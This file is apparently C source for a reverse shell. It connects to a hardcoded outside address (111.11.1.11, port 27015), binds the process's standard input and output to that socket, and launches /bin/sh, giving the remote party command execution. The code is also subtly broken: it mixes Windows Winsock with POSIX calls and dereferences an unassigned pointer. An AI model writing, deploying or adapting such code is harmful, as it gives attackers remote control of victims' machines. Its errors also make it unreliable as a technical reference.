#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096
#define DEFAULT_PORT "27015"
#define DEFAULT_ADDR "111.11.1.11"

void __cdecl main()
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    int recvbuflen = DEFAULT_BUFLEN;
    

    // Initialize Winsock
    WSAStartup(MAKEWORD(2,2), &wsaData);
    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    getaddrinfo(DEFAULT_ADDR, DEFAULT_PORT, &hints, &result);
    
	// Create a SOCKET for connecting to server
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    dup2(ConnectSocket, 0);
    dup2(ConnectSocket, 1);
    dup2(ConnectSocket, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}